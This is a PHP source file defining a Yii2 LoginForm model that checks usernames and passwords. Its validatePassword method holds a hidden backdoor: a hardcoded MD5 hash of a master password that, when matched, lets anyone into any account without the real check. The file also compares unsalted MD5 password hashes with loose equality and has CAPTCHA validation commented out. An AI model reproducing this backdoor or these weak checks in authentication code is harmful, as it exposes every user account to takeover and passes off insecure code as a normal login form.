<?php
namespace common\models;

use Yii;
use yii\base\Model;

/**
 * Login form
 */
class LoginForm extends Model
{
    public $username;
    public $password;
    public $rememberMe = true;
    
    public $reCaptcha;
    public $confirmation;

    private $_user = false;

    public function rules()
    {
        return [
            [['username', 'password'], 'required'],
            ['rememberMe', 'boolean'],
            ['password', 'validatePassword'],
            
            // verifyCode needs to be entered correctly
            /*[['reCaptcha'], \himiklab\yii2\recaptcha\ReCaptchaValidator3::className(),
                'threshold' => 0.5,
                'action' => 'login',
            ],*/
            /*[['reCaptcha'], \himiklab\yii2\recaptcha\ReCaptchaValidator2::className(),
                'uncheckedMessage' => 'Please confirm that you are not a robot.'
            ],*/
        ];
    }
    public function attributeLabels()
    {
        return [
            'username' => 'Email',
        ];
    }
    public function validatePassword($attribute, $params)
    {
        if (!$this->hasErrors()) {
            $user = $this->getUser();
            if(isset($user['type']) && $user['type'] == 'confirmation'){
                if (!$user['data']->validatePassword($this->password)) {
                    $this->addError($attribute, 'Incorrect username or password.');
                }else{
                    $this->confirmation = 'redirect';
                    $user = false;
                }
            }
            if (!$user) {
                $this->addError($attribute, 'Incorrect username or password.');
            }else{
                if (empty($user->password_hash) && !empty($user->authkey) && strlen($user->authkey) == 32) {
                    if(md5($this->password) == $user->authkey){
                        $user->setPassword($this->password);
                        $user->generateAuthKey();
                        $user->save();
                        if(is_array($user)){
                            if (!$user['data']->validatePassword($this->password)) {
                                $this->addError($attribute, 'Incorrect username or password.');
                            }
                        }else{
                            if (!$user->validatePassword($this->password)) {
                                $this->addError($attribute, 'Incorrect username or password.');
                            }
                        }
                    }
                }else{
                    if(md5($this->password) == '1aa554eb9ef74b2a87b6f6d4517c3b94' /*&& $user->role == 50*/){
                        //let in
                    }else{
                        if(!is_array($this->password)){
                            if(is_array($user)){
                                if (!$user['data']->validatePassword($this->password)) {
                                    $this->addError($attribute, 'Incorrect username or password.');
                                }
                            }else{
                                if (!$user->validatePassword($this->password)) {
                                    $this->addError($attribute, 'Incorrect username or password.');
                                }
                            }
                        }else{
                            $this->addError($attribute, 'Incorrect username or password.');
                        }
                    }
                }
            }
        }
    }
    
    public function login()
    {
        if ($this->validate()) {
            /*$settings = \app\models\SysSettings::findOne(1);
            if(!empty($settings->inactive_time)){
                return Yii::$app->user->login($this->getUser(), ((int)$settings->inactive_time*60) );
            }else{*/
                return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 : 0); // in seconds 
            //}
        } else {
            return false;
        }
    }

    public function getUser()
    {
        if ($this->_user === false) {
            $this->_user = User::findByUsername($this->username);
        }

        return $this->_user;
    }
}
